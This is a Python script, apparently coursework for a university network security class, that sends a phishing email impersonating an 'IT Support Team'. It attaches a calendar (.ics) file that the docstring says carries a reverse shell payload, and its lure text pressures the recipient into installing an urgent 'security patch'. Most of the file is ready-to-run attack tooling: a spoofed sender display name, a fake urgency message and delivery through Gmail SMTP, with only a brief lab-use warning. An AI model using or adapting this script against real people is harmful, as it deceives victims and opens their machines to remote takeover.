#!/usr/bin/env python3
"""
send_calendar_invite.py
=======================
CSE804: Network and Internet Security — Task 2
Google Calendar Phishing Attack Simulation

Sends a malicious iCalendar (.ics) file as an email attachment,
impersonating an IT Support Team to trick the victim into executing
a reverse shell payload embedded in the calendar event location field.

USAGE:
    1. Fill in ATTACKER_CONFIG and VICTIM_CONFIG below.
    2. Generate an App Password in Gmail (Settings → Security → App Passwords).
    3. Run: python3 send_calendar_invite.py

WARNING: For educational/lab use only. Never use against systems or
         accounts you do not own or have explicit permission to test.
"""

import smtplib
import os
from email.message import EmailMessage
from email.utils import formataddr

# =============================================================================
# CONFIGURATION — edit these values before running
# =============================================================================

SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT   = 587

# Attacker's Gmail credentials
# Use an App Password if 2FA is enabled:
#   Google Account → Security → 2-Step Verification → App Passwords
GMAIL_USER = 'your_gmail@gmail.com'         # Replace with attacker Gmail
GMAIL_PASS = 'xxxx xxxx xxxx xxxx'          # Replace with App Password

# Email identity (spoofed sender display name)
FROM_NAME  = 'IT Support Team'
FROM_EMAIL = 'itsupport@example.com'        # Display name only — actual send is GMAIL_USER

# Victim's email address
TO_EMAIL   = 'victim@example.com'           # Replace with victim's email

# Email subject line
SUBJECT = 'Urgent Security Update Required — Action Needed'

# Path to the .ics file (must be in same directory as this script)
ICS_FILE = 'malicious_invite.ics'

# =============================================================================
# EMAIL BODY
# =============================================================================

EMAIL_BODY = """\
Dear User,

Please find the attached calendar invite for the mandatory security update.

Our security team has identified a critical vulnerability affecting your system.
You are required to install the patch immediately by following the instructions
in the calendar event.

Best Regards,
IT Support Team
University of Dhaka
"""

# =============================================================================
# MAIN — build and send the email
# =============================================================================

def send_phishing_email():
    if not os.path.exists(ICS_FILE):
        print(f"[ERROR] ICS file not found: {ICS_FILE}")
        print("        Make sure malicious_invite.ics is in the same directory.")
        return False

    msg = EmailMessage()
    msg['Subject'] = SUBJECT
    msg['From']    = formataddr((FROM_NAME, FROM_EMAIL))
    msg['To']      = TO_EMAIL

    msg.set_content(EMAIL_BODY)

    # Attach the malicious .ics file
    with open(ICS_FILE, 'r') as f:
        ics_content = f.read()

    msg.add_attachment(
        ics_content.encode(),
        maintype='text',
        subtype='calendar',
        filename='malicious_invite.ics'
    )

    print(f"[*] Connecting to {SMTP_SERVER}:{SMTP_PORT} ...")
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.ehlo()
            server.starttls()
            server.ehlo()
            print(f"[*] Logging in as {GMAIL_USER} ...")
            server.login(GMAIL_USER, GMAIL_PASS)
            print(f"[*] Sending email to {TO_EMAIL} ...")
            server.send_message(msg)
            print("[+] Email sent successfully!")
            return True
    except smtplib.SMTPAuthenticationError:
        print("[ERROR] Authentication failed. Check GMAIL_USER and GMAIL_PASS.")
        print("        If using 2FA, generate an App Password at:")
        print("        https://myaccount.google.com/apppasswords")
    except smtplib.SMTPException as e:
        print(f"[ERROR] SMTP error: {e}")
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
    return False


if __name__ == '__main__':
    print("=" * 60)
    print("  CSE804 — Google Calendar Phishing Simulation")
    print("=" * 60)
    print(f"  From   : {FROM_NAME} <{FROM_EMAIL}>")
    print(f"  To     : {TO_EMAIL}")
    print(f"  Subject: {SUBJECT}")
    print(f"  ICS    : {ICS_FILE}")
    print("=" * 60)
    send_phishing_email()
